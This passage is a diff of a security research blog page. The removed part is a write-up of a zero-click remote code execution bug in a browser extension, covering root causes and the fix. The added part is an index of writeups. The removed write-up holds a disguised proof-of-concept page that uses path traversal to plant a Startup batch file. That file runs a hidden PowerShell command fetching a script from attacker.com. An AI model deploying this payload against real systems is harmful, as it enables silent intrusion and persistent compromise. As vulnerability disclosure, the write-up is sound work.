-                <pre><code class="language-javascript">case 11:  // SaveScreenRecording
-    // Validates message SHAPE, not ORIGIN
-    if (!a || typeof a !== "object" ||
-        a.action !== "SaveScreenRecording" ||
-        typeof a.za !== "object" ||
-        typeof a.filename !== "string" ||
-        typeof a.L !== "string") {
-        break;
-    }
-    // Build protobuf message
-    B = new Qg;
-    Rg(B, new Uint8Array(a.za));   // ATTACKER CONTROLLED
-    cd(B, 2, a.filename);           // ATTACKER CONTROLLED
-    cd(B, 3, a.L);                  // ATTACKER CONTROLLED
-    return z(n, dh(B).then(...), 16);</code></pre>
-            </section>
-
-            <section id="path-traversal">
-                <h2>Part 5: Path Traversal</h2>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph Normal["Intended"]
-        N1["Base: brain/"] --> N2["L = 'session123'"] --> N3["Result: brain/session123/recording.webm"]
-    end
-    subgraph Attack["Exploited"]
-        A1["Base: brain/"] --> A2["L = '../../../Desktop'"] --> A3["Result: Desktop/payload.bat"]
-    end
-    style A2 fill:#ff6b6b,color:#fff
-    style A3 fill:#ff6b6b,color:#fff
-                    </pre>
-                </div>
-            </section>
-
-            <section id="code-execution">
-                <h2>Part 6: Achieving Code Execution</h2>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-sequenceDiagram
-    autonumber
-    participant V as 👤 Victim
-    participant B as 🌐 Browser
-    participant W as 💀 evil.com
-    participant E as 🔓 Extension
-    participant SW as ⚙️ Service Worker
-    participant LS as 📡 Language Server
-    participant FS as 💾 File System
-    participant OS as 🖥️ Operating System
-
-    V->>B: Opens browser<br/>(Antigravity installed)
-    Note over E: Extension loaded<br/>externally_connectable: all_urls
-
-    V->>W: Visits evil.com
-    Note over W: Page loads with<br/>embedded exploit
-
-    rect rgb(255,107,107,0.1)
-        Note over W,FS: 🔴 ATTACK PHASE - Zero User Interaction
-        W->>E: chrome.runtime.sendMessage()<br/>extensionId: 'eeijfnjm...'
-        Note over W: Payload:<br/>action: SaveScreenRecording<br/>za: [malicious bytes]<br/>filename: WindowsUpdate.bat<br/>L: ../../../AppData/.../Startup
-
-        E->>SW: Route to handler
-        Note over SW: ⚠️ No sender.origin check<br/>⚠️ No sender.tab check
-
-        SW->>SW: Build protobuf message<br/>Qg(za, filename, L)
-        SW->>LS: gRPC-Web POST<br/>/SaveScreenRecording
-
-        Note over LS: Process request<br/>No path validation
-        LS->>FS: Write file<br/>Path: brain/../../../Startup/
-        Note over FS: Path traversal resolves to:<br/>C:\Users\X\Startup\WindowsUpdate.bat
-        FS-->>LS: Success
-    end
-
-    LS-->>E: Response: OK
-    E-->>W: Callback (ignored)
-    Note over V: Victim unaware<br/>No visual indication
-
-    rect rgb(248,81,73,0.3)
-        Note over V,OS: 🔴 PERSISTENCE ACHIEVED
-        V->>OS: Next system login
-        OS->>OS: Execute Startup folder contents
-        Note over OS: WindowsUpdate.bat runs<br/>→ PowerShell reverse shell<br/>→ Full system compromise
-    end
-                    </pre>
-                </div>
-
-                <h3>Proof of Concept</h3>
-                <div class="video-container">
-                    <div class="video-wrapper">
-                        <iframe src="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/preview" allowfullscreen></iframe>
+            <div class="writeups-grid">
+                <!-- Antigravity RCE -->
+                <article class="writeup-card fade-in">
+                    <div class="card-glow"></div>
+                    <div class="card-content">
+                        <div class="writeup-header">
+                            <div class="writeup-tags">
+                                <span class="tag critical pulse">Critical</span>
+                                <span class="tag">Zero-Click</span>
+                                <span class="tag">RCE</span>
+                            </div>
+                            <span class="writeup-date">Nov 2025</span>
+                        </div>
+                        <h3 class="writeup-title">Zero-Click RCE in Google DeepMind's Antigravity</h3>
+                        <p class="writeup-excerpt">Any website could silently write files anywhere on your system. A critical vulnerability in an AI browser assistant.</p>
+                        <div class="writeup-meta">
+                            <span class="meta-item">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                25 min
+                            </span>
+                            <span class="meta-item cvss">CVSS 9.8</span>
+                            <span class="meta-item dupe">Duplicate</span>
+                        </div>
+                        <a href="posts/antigravity/" class="writeup-link">
+                            Read Analysis
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
+                                <path d="M5 12h14M12 5l7 7-7 7"/>
+                            </svg>
+                        </a>
                     </div>
-                    <div class="video-caption">
-                        <span class="video-badge">POC Demo</span>
-                        <span>Zero-Click RCE Exploitation in Action</span>
+                </article>
+
+                <!-- Account Takeover -->
+                <article class="writeup-card fade-in">
+                    <div class="card-glow success"></div>
+                    <div class="card-content">
+                        <div class="writeup-header">
+                            <div class="writeup-tags">
+                                <span class="tag critical pulse">Critical</span>
+                                <span class="tag">One-Click</span>
+                                <span class="tag">ATO</span>
+                            </div>
+                            <span class="writeup-date">2025</span>
+                        </div>
+                        <h3 class="writeup-title">$6,000 Bug Bounty: One-Click Account Takeover</h3>
+                        <p class="writeup-excerpt">Client-Side Path Traversal leading to full account takeover. One click was all it took.</p>
+                        <div class="writeup-meta">
+                            <span class="meta-item">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="M12 6v6l4 2"></path>
+                                </svg>
+                                10 min
+                            </span>
+                            <span class="meta-item cvss">CVSS 9+</span>
+                            <span class="meta-item bounty">$6,000</span>
+                        </div>
+                        <a href="posts/account-takeover/" class="writeup-link">
+                            Read Analysis
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
+                                <path d="M5 12h14M12 5l7 7-7 7"/>
+                            </svg>
+                        </a>
                     </div>
-                </div>
-                <div class="poc-video">
-                    <a href="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/view" target="_blank" rel="noopener" class="poc-link">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="24" height="24">
-                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
-                        </svg>
-                        Open in New Tab
-                    </a>
-                </div>
-                <pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;&lt;title&gt;Cute Cat Pictures&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;Loading cats...&lt;/h1&gt;
-&lt;script&gt;
-const payload = `@echo off
-powershell -w hidden -ep bypass -c "IEX(curl http://attacker.com/shell.ps1)"`;
+                </article>
+            </div>
+        </section>
+    </main>
 
-chrome.runtime.sendMessage("eeijfnjmjelapkebgockoeaadonbchdd", {
-    action: "SaveScreenRecording",
-    za: Array.from(new TextEncoder().encode(payload)),
-    filename: "WindowsUpdate.bat",
-    L: "../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-});
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-            </section>
-
-            <section id="additional-vectors">
-                <h2>Part 7: Additional Attack Vectors</h2>
-                <h3>CDP Exposure</h3>
-                <pre><code class="language-bash">$ curl http://127.0.0.1:9222/json/list
-# Returns all debug targets - no auth required!</code></pre>
-                <h3>CSRF Token in Command Line</h3>
-                <pre><code class="language-bash">$ wmic process where "commandline like '%language_server%'" get commandline
-language_server_windows_x64.exe --csrf_token d0e7aead-f94f-4acb-bf36-84ed12a0e1bb</code></pre>
-            </section>
-
-            <section id="root-causes">
-                <h2>Part 8: Root Causes</h2>
-                <p>Three distinct security failures combined to create this vulnerability:</p>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph RC1_Box["🔓 Root Cause 1: Overly Permissive Manifest"]
-        RC1["externally_connectable: &lt;all_urls&gt;<br/>─────────────<br/>• Any website can send messages<br/>• No domain allowlist<br/>• Chrome's protection bypassed"]
-        RC1_Fix["✅ Fix: Restrict to specific origins<br/>or remove externally_connectable"]
-    end
-    subgraph RC2_Box["⚠️ Root Cause 2: Missing Origin Validation"]
-        RC2["No sender.origin check<br/>─────────────<br/>• Handler trusts all messages<br/>• No sender.tab verification<br/>• No sender.id comparison"]
-        RC2_Fix["✅ Fix: Validate sender.url<br/>contains offscreen.html"]
-    end
-    subgraph RC3_Box["📁 Root Cause 3: Path Traversal"]
-        RC3["No path sanitization<br/>─────────────<br/>• L parameter unchecked<br/>• ../ sequences allowed<br/>• Arbitrary write location"]
-        RC3_Fix["✅ Fix: Sanitize path components<br/>reject ../ sequences"]
-    end
-    subgraph Impact["💀 Combined Impact"]
-        Vuln["Zero-Click RCE<br/>─────────────<br/>CVSS: 9.8 Critical<br/>• No user interaction<br/>• Persistent compromise<br/>• Full system access"]
-    end
-    RC1 --> Vuln
-    RC2 --> Vuln
-    RC3 --> Vuln
-    RC1 -.-> RC1_Fix
-    RC2 -.-> RC2_Fix
-    RC3 -.-> RC3_Fix
-    style Vuln fill:#ff6b6b,color:#fff,stroke:#ff6b6b
-    style RC1 fill:#ffa94d,color:#000
-    style RC2 fill:#ffa94d,color:#000
-    style RC3 fill:#ffa94d,color:#000
-    style RC1_Fix fill:#3fb950,color:#fff
-    style RC2_Fix fill:#3fb950,color:#fff
-    style RC3_Fix fill:#3fb950,color:#fff
-                    </pre>
-                </div>
-
-                <div class="callout callout-warning">
-                    <strong>Key Insight:</strong> Each vulnerability alone might be considered low-to-medium severity. Combined, they form a critical attack chain. This is a common pattern in real-world exploits.
-                </div>
-            </section>
-
-            <section id="fix">
-                <h2>Part 9: The Fix</h2>
-                <p>Google's fix in version 1.11.3 implements a three-layer validation:</p>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph Incoming["📨 Incoming Message"]
-        Msg["SaveScreenRecording Request<br/>─────────────<br/>sender object attached"]
-    end
-    subgraph Validation["🔒 Three-Layer Validation"]
-        Check1["1️⃣ Origin Check<br/>─────────────<br/>sender.url includes<br/>'/static/offscreen.html'?"]
-        Check2["2️⃣ Extension ID Check<br/>─────────────<br/>sender.id === <br/>chrome.runtime.id?"]
-        Check3["3️⃣ Context Check<br/>─────────────<br/>!sender.tab?<br/>(not from web page)"]
-    end
-    subgraph Results["📋 Results"]
-        Allow["✅ ALLOW<br/>─────────────<br/>Process request<br/>Write to filesystem"]
-        Deny["❌ DENY<br/>─────────────<br/>Return error<br/>Log attempt"]
-    end
-    Msg --> Check1
-    Check1 -->|"✓ Yes"| Check2
-    Check1 -->|"✗ No"| Deny
-    Check2 -->|"✓ Yes"| Check3
-    Check2 -->|"✗ No"| Deny
-    Check3 -->|"✓ Yes (null)"| Allow
-    Check3 -->|"✗ No (has tab)"| Deny
-    style Allow fill:#3fb950,color:#fff
-    style Deny fill:#ff6b6b,color:#fff
-    style Check1 fill:#58a6ff,color:#fff
-    style Check2 fill:#58a6ff,color:#fff
-    style Check3 fill:#58a6ff,color:#fff
-                    </pre>
-                </div>
-                <pre><code class="language-javascript">// Fixed version - validates message origin
-function isAuthorizedSender(sender) {
-  // Check 1: Must come from offscreen document
-  const isFromOffscreen = sender.url?.includes("/static/offscreen.html");
-
-  // Check 2: Must be from same extension
-  const isSameExtension = sender.id === chrome.runtime.id;
-
-  // Check 3: Must NOT come from a tab (web pages have sender.tab)
-  const isNotFromTab = !sender.tab;
-
-  return isFromOffscreen && isSameExtension && isNotFromTab;
-}
-
-// In message handler
-chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
-  if (!isAuthorizedSender(sender)) {
-    console.warn("Unauthorized message attempt from:", sender.origin);
-    return { error: "Unauthorized" };
-  }
-  // ... process legitimate message
-});</code></pre>
-
-                <div class="callout callout-success">
-                    <strong>Defense in Depth:</strong> The fix validates at multiple layers - origin URL, extension ID, and context type. Even if one check is bypassed, others prevent exploitation.
-                </div>
-            </section>
-
-            <section id="lessons">
-                <h2>Part 10: Lessons Learned</h2>
-                <div class="lessons-grid">
-                    <div class="lesson-category">
-                        <h4>Extension Developers</h4>
-                        <ul><li>Validate message senders</li><li>Sanitize all paths</li><li>Audit minifier output</li></ul>
-                    </div>
-                    <div class="lesson-category">
-                        <h4>Security Researchers</h4>
-                        <ul><li>AI tools = high-value targets</li><li>Check manifest.json</li><li>Look for CDP exposure</li></ul>
-                    </div>
-                    <div class="lesson-category">
-                        <h4>Users</h4>
-                        <ul><li>Review permissions</li><li>Keep extensions updated</li></ul>
-                    </div>
-                </div>
-            </section>
-
-            <section id="bigger-picture">
-                <h2>Part 11: The Bigger Picture</h2>
-                <blockquote class="key-takeaway">
-                    <strong>Always verify who's asking. Always sanitize paths. Always assume external input is malicious.</strong>
-                </blockquote>
-            </section>
-
-            <section id="conclusion">
-                <h2>Conclusion</h2>
-                <p>This vulnerability was hiding in plain sight. Each issue alone might seem minor—together, they created a zero-click malware delivery system.</p>
-                <div class="vulnerability-summary">
-                    <div class="summary-item"><span class="summary-label">Extension ID:</span><code>eeijfnjmjelapkebgockoeaadonbchdd</code></div>
-                    <div class="summary-item"><span class="summary-label">Vulnerable:</span><span class="version vulnerable">1.11.2</span></div>
-                    <div class="summary-item"><span class="summary-label">Fixed:</span><span class="version fixed">1.11.3</span></div>
-                </div>
-            </section>
-
-            <section id="references">
-                <h2>References</h2>
-                <ul class="references-list">
-                    <li><a href="https://alokbishoyi.com/blogposts/reverse-engineering-browser-automation.html" target="_blank">Reverse Engineering Antigravity's Browser Automation</a> - Alok Bishoyi</li>
-                    <li><a href="https://gist.github.com/avilum/ae9e694e97a2575a19878a879d72ca07" target="_blank">AntiGravity Tools Reverse Engineering</a> - @avilum</li>
-                    <li>Chrome DevTools Protocol Documentation</li>
-                    <li>Chrome Extension Security Best Practices</li>
-                </ul>
-            </section>
+    <footer class="footer glass">
+        <div class="footer-content">
+            <span class="footer-text">Security Research</span>
+            <span class="footer-divider">|</span>
+            <a href="https://x.com/hamidonsolo" target="_blank" rel="noopener" class="footer-link">@hamidonsolo</a>
         </div>
-    </article>
+    </footer>
 
-    <footer class="footer"><p>Security Research Blog</p></footer>
-
-    <button class="back-to-top" id="backToTop" aria-label="Back to top">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 15l-6-6-6 6"></path></svg>
-    </button>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
     <script src="script.js"></script>
+    <script>
+        // Counter animation
+        document.addEventListener('DOMContentLoaded', () => {
+            const counters = document.querySelectorAll('.counter');
+            counters.forEach(counter => {
+                const target = parseInt(counter.dataset.target);
+                const duration = 2000;
+                const step = target / (duration / 16);
+                let current = 0;
+
+                const timer = setInterval(() => {
+                    current += step;
+                    if (current >= target) {
+                        counter.textContent = target.toLocaleString();
+                        clearInterval(timer);
+                    } else {
+                        counter.textContent = Math.floor(current).toLocaleString();
+                    }
+                }, 16);
+            });
+
+            // Fade in on scroll
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            }, { threshold: 0.1 });
+
+            document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+        });
+    </script>
 </body>
 </html>
